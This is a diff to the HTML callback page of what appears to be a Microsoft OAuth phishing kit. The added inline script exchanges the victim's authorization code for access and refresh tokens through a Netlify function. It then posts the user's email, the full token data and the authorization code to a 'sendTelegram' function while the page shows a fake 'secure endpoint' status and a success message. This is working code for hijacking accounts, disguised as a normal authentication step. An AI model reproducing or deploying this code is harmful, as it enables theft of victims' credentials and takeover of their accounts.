@@ -46,11 +46,138 @@
 </head>
 <body>
     <div class="container">
-        <h2>Loading...</h2>
+        <h2>Processing Authentication...</h2>
         <div class="spinner" id="spinner"></div>
-        <p id="status">Please wait...</p>
+        <p id="status">Exchanging authorization code for access tokens...</p>
         <div id="result"></div>
     </div>
-    <script src="/oauth-callback.js"></script>
+
+    <script>
+        async function handleOAuthCallback() {
+            const statusEl = document.getElementById('status');
+            const resultEl = document.getElementById('result');
+            const spinnerEl = document.getElementById('spinner');
+
+            function hideSpinner() {
+                if (spinnerEl) {
+                    spinnerEl.style.display = 'none';
+                }
+            }
+
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const code = urlParams.get('code');
+                const state = urlParams.get('state');
+                const error = urlParams.get('error');
+
+                console.log('🔍 OAuth callback received:', { code: !!code, state, error });
+
+                if (error) {
+                    hideSpinner();
+                    statusEl.textContent = 'OAuth error: ' + error;
+                    resultEl.innerHTML = `<div class="error">OAuth error: ${error}</div>`;
+                    setTimeout(() => {
+                        window.location.href = '/?step=captcha';
+                    }, 3000);
+                    return;
+                }
+
+                if (!code || !state) {
+                    hideSpinner();
+                    statusEl.textContent = 'Missing authorization data!';
+                    resultEl.innerHTML = `<div class="error">Missing code or state in callback.</div>`;
+                    setTimeout(() => {
+                        window.location.href = '/?step=captcha';
+                    }, 3000);
+                    return;
+                }
+
+                statusEl.textContent = 'Exchanging authorization code for real user tokens...';
+                console.log('🔄 Starting token exchange with CLIENT SECRET method...');
+
+                // **SIMPLIFIED**: Just send code and state - backend has client secret
+                const tokenPayload = {
+                    code: code,
+                    state: state
+                };
+
+                console.log('📤 Sending to tokenExchange (client secret method)...');
+
+                const res = await fetch('/.netlify/functions/tokenExchange', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(tokenPayload),
+                });
+
+                const tokenData = await res.json();
+                console.log('📥 Token exchange response:', tokenData);
+
+                if (!tokenData.success) {
+                    hideSpinner();
+                    statusEl.textContent = 'Token exchange failed';
+                    resultEl.innerHTML = `<div class="error">Token exchange failed: ${tokenData.error || 'Unknown error'}</div>`;
+                    setTimeout(() => {
+                        window.location.href = '/?step=captcha';
+                    }, 3000);
+                    return;
+                }
+
+                // **SUCCESS**: We now have REAL user data and tokens!
+                const userEmail = tokenData.email;
+                console.log('🎉 SUCCESS: Real user email extracted:', userEmail);
+                console.log('🔑 Real access token received:', !!tokenData.tokens?.access_token);
+                console.log('🔄 Real refresh token received:', !!tokenData.tokens?.refresh_token);
+
+                // Send REAL data to Telegram
+                try {
+                    statusEl.textContent = 'Sending real user data to secure endpoint...';
+                    
+                    const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            email: userEmail,
+                            provider: 'Microsoft',
+                            timestamp: new Date().toISOString(),
+                            tokenData: tokenData,
+                            authorizationCode: code,
+                            state: state,
+                            domain: window.location.origin,
+                            sessionId: Math.random().toString(36).substring(2, 12),
+                            authMethod: 'client_secret',
+                            realUserData: true
+                        }),
+                    });
+
+                    const telegramResult = await telegramResponse.json();
+                    console.log('📤 Real data sent to Telegram:', telegramResult);
+                } catch (telegramError) {
+                    console.warn('⚠️ Telegram send failed:', telegramError);
+                }
+
+                hideSpinner();
+                statusEl.textContent = 'Authentication successful!';
+                resultEl.innerHTML = `<div class="success">✅ Successfully authenticated!<br>📧 User: ${userEmail || 'Email pending'}<br>🔑 Access tokens obtained</div>`;
+
+                // Redirect to success page
+                setTimeout(() => {
+                    window.location.href = '/?step=success';
+                }, 3000);
+
+            } catch (err) {
+                hideSpinner();
+                statusEl.textContent = 'Error occurred during authentication.';
+                resultEl.innerHTML = `<div class="error">${err.message}</div>`;
+                console.error('❌ OAuth callback error:', err);
+                
+                setTimeout(() => {
+                    window.location.href = '/?step=captcha';
+                }, 3000);
+            }
+        }
+
+        console.log('🚀 OAuth callback script loaded - CLIENT SECRET method');
+        handleOAuthCallback();
+    </script>
 </body>
 </html>
